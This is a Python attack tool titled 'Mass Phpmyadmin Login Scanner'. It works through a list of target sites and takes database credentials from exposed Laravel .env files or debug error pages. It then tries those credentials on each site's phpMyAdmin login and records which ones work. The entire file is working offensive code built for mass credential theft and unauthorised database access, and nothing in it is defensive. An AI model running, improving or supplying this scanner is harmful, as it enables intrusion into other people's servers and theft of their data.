#just for fun
import requests as p
import re
from threading import Thread
import os

pala = {'User-Agent': 'Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19'}

#banner
def ban():
    if os.name == 'nt': os.system('cls')
    else: os.system('clear')
    xxx = """
    [+] Mass Phpmyadmin Login Scanner [+]
        [+] From env configuration [+]
         [+] Created By FaizGanz [+]\n
    """
    print(xxx)
    
#CekLogin
def login(url, usr, pwd):
    urllog = url+'/phpmyadmin/'
    try:
        reqToken = p.get(urllog, headers=pala).text
        token = re.findall('name="token" value="(.*?)"', reqToken)[0]
    except:
        token = '2295ef2ef3886e2a25cb942a9c104bf3'
    try:
        dataLog = {
            'pma_username': usr,
            'pma_password': pwd,
            'server': '1',
            'target': 'index.php',
            'token': token
        }
        cekLog = p.post(urllog, data=dataLog, headers=pala)
        if 'Log out' in cekLog.text:
            print('[+] Success Login {} > {} > {} [+]'.format(url, usr, pwd))
            svwork = open('successlogin.txt', 'a')
            svwork.write(urllog+'|'+usr+'|'+pwd+'\n')
            svwork.close()
        else:
            print('[-] Cant Login {} > {} > {} [-]'.format(url, usr, pwd))
            svwork = open('cantlogin.txt', 'a')
            svwork.write(urllog+'|'+usr+'|'+pwd+'\n')
            svwork.close()
    except Exception:
        print('[*] Cant Access sites > {} [*]'.format(url))

#Find User/Pass   
def getup(url, text):
    try:
        if 'DB_USERNAME=' in text:
            user = re.findall('\nDB_USERNAME=(.*?)\n', text)[0]
            passwd = re.findall('\nDB_PASSWORD=(.*?)\n', text)[0]
        elif '<td>DB_USERNAME</td>' in text:
            user = re.findall('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
            passwd = re.findall('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
        else:
            print('[-] Cant Get Username/Password [-]')
    except:
        print('[*] Something wrong [*]')
    finally:
        login(url, user, passwd)

#cek url
def cek(url):
    purl = url+'/phpmyadmin/'
    logurl = False
    resp = False
    try:
        Cekphpmyadmin = p.get(purl, headers=pala, timeout=14)
        if 'pma_username' in Cekphpmyadmin.text:
            logurl = url
        else:
            logurl = False
    except Exception:
        print('[*] Cant Acces sites > {} [*]'.format(url))
    try:
        envcek = p.get(url+'/.env', headers=pala, timeout=14).text
        if 'DB_PASSWORD=' in envcek:
            resp = envcek
        else:
            debugcek = p.post(url, data={1: 1}, headers=pala, timeout=7).text
            if '<td>DB_PASSWORD</td>' in debugcek:
                resp = debugcek
        if logurl and resp:
            getup(logurl, resp)
        elif not logurl and resp:
            print('[-] Cant get phpmyadmin login > {} [-]'.format(url))
    except:
        print('[*] Cant Access sites > {} [*]'.format(url))

        
if __name__ == '__main__':
    ban()
    urlt = open(input('[+] Url List ~# '), 'r').read().split('\n')
    for tar in urlt:
        if '://' in tar: pass
        else: tar = 'http://'+tar
        t = Thread(target=cek, args=(tar,))
        t.start()
